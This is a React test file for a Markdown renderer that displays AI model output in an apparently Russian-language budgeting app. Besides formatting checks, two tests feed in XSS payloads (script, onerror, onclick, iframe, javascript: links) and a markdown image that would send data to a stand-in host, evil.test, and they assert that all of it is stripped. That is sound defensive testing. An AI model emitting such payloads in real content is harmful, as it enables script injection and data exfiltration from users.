import { screen } from '@testing-library/react'
import { renderWithProviders } from '../test/render'
import { Markdown } from './Markdown'

function renderMarkdown(text: string) {
  return renderWithProviders(<Markdown>{text}</Markdown>)
}

describe('Markdown', () => {
  it('renders headings, emphasis and lists as real elements', () => {
    renderMarkdown('### 📊 Итог месяца\n\nПотрачено **12 000 ₽**.\n\n- первое\n- второе\n\n1. раз\n2. два')

    expect(screen.getByRole('heading', { name: '📊 Итог месяца' })).toBeInTheDocument()
    expect(screen.getByText('12 000 ₽').tagName).toBe('STRONG')
    expect(screen.getAllByRole('listitem')).toHaveLength(4)
    expect(screen.getByText('первое')).toBeInTheDocument()
  })

  it('renders GFM tables', () => {
    renderMarkdown('| Категория | Потрачено |\n|---|---:|\n| Еда | 8 000 ₽ |\n| Кафе | 2 000 ₽ |')

    expect(screen.getByRole('table')).toBeInTheDocument()
    expect(screen.getByRole('columnheader', { name: 'Категория' })).toBeInTheDocument()
    expect(screen.getByRole('cell', { name: '8 000 ₽' })).toBeInTheDocument()
    expect(screen.getAllByRole('row')).toHaveLength(3)
  })

  it('turns <br> inside table cells into a space instead of gluing the words together', () => {
    renderMarkdown('| Статус |\n|---|\n| warn<br>почти исчерпан<br/>лимит |')

    expect(screen.getByRole('cell', { name: 'warn почти исчерпан лимит' })).toBeInTheDocument()
  })

  it('never renders raw HTML from the model', () => {
    const { container } = renderMarkdown(
      'Привет <script>window.hacked = 1</script><img src="http://evil.test/x.png" onerror="window.hacked = 1">\n\n' +
        '<a href="http://evil.test" onclick="window.hacked = 1">ссылка</a> <b>жирный</b> <iframe src="http://evil.test"></iframe>',
    )

    expect(container.querySelector('script, img, iframe, a, b')).toBeNull()
    expect(container.querySelector('[onerror], [onclick]')).toBeNull()
    expect((window as unknown as { hacked?: number }).hacked).toBeUndefined()
    expect(screen.getByText(/Привет/)).toBeInTheDocument()
  })

  it('does not load images, so a picture cannot carry data to a foreign server', () => {
    const { container } = renderMarkdown('![x](http://evil.test/p.png?data=secret)')

    expect(container.querySelector('img')).toBeNull()
  })

  it('shows links as plain text, with no way to click through', () => {
    const { container } = renderMarkdown(
      '[безопасный](https://example.com) и [опасный](javascript:alert(1)) и https://auto.example.com',
    )

    expect(container.querySelector('a')).toBeNull()
    expect(screen.getByText(/безопасный/)).toBeInTheDocument()
    expect(screen.getByText(/опасный/)).toBeInTheDocument()
  })
})
